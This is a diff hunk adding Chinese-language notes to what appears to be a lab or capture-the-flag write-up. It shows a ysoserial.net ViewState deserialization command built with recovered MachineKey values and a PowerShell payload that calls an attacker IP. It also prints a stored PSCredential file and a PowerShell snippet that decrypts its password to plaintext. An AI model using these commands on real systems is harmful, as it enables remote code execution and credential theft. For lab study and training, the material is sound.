@@ -537,7 +537,41 @@ PORT   STATE SERVICE
 [ViewState反序列化攻击](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter)
 
 关键是要寻找`MachineKey`,在pentest/Vuln/asp下的俩个工具都尝试了
+可以利用工具[ysoserial.net](https://github.com/pwntester/ysoserial.net.git)来攻击
+```bash
+.\ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://10.10.16.26:4444/$env:UserName" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
+```
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240309213933.png)
+成功收到请求
+然后弹个shell回来
 
+在Documents文件夹下有一个connection.xml文件,需要解密
+```xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">alaading</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
+    </Props>
+  </Obj>
+</Objs>
+```
+
+```powershell
+$EncryptedString = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6"
+$SecureString = ConvertTo-SecureString $EncryptedString
+$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
+echo $Credential.GetNetworkCredential().password
+```
+
+
+
+使用powershell解密得到密码`f8gQ8fynP44ek1m3`
 ### Manager
 #### user
 - nmap
